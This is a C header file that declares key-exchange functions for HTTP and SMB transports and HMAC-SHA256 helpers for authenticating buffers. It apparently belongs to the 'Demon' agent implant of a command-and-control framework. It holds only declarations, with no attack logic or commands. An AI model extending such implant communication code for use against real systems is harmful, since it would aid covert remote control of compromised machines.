#ifndef DEMON_TRANSPORT_KEX_H
#define DEMON_TRANSPORT_KEX_H

#include <Demon.h>
#include <core/CryptoKex.h>

#ifdef TRANSPORT_HTTP
BOOL HttpKex( PVOID* RecvData, PSIZE_T RecvSize );
#endif

#ifdef TRANSPORT_SMB
BOOL SmbKex( VOID );
#endif

// HMAC-SHA256 over buffer with AESMac key (32-byte)
BOOL TransportMacAppend(_In_ PBUFFER Buf);
BOOL TransportMacVerifyAndTrim(_Inout_ PBUFFER Buf);

#endif // DEMON_TRANSPORT_KEX_H

